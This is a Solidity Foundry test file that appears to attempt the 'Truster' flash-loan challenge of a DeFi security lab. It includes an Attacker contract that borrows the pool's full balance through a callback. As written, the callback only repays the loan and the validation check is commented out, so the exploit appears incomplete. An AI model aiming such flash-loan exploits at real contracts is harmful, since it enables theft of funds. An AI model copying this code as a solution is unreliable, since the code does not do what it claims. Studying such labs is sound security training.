// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/truster/TrusterLevel.sol";
import "@openzeppelin/contracts//token/ERC20/IERC20.sol";

interface ITrusterPool {
  function flashLoan(
    uint256 amount,
    address borrower,
    address target,
    bytes calldata data) external returns (bool);
}

contract Attacker {
  TrusterLevel internal level;
  ITrusterPool internal pool;
  IERC20 internal token;

  constructor(TrusterLevel _level) {
    level = _level;
    pool = ITrusterPool(address(level.pool()));
    token = IERC20(address(level.token()));
  }

  function attack() public {
    bytes memory data = abi.encodeWithSignature("onFlashLoan()");

    pool.flashLoan(
      level.TOKENS_IN_POOL(),
      address(this),
      address(this),
      data
    );
  }

  function onFlashLoan() public {
    token.transfer(address(pool), level.TOKENS_IN_POOL());
  }
}

contract TrusterTest is Test {
  TrusterLevel internal level = new TrusterLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    Attacker attacker = new Attacker(level);
    attacker.attack();
    // level.validate();
  }
}
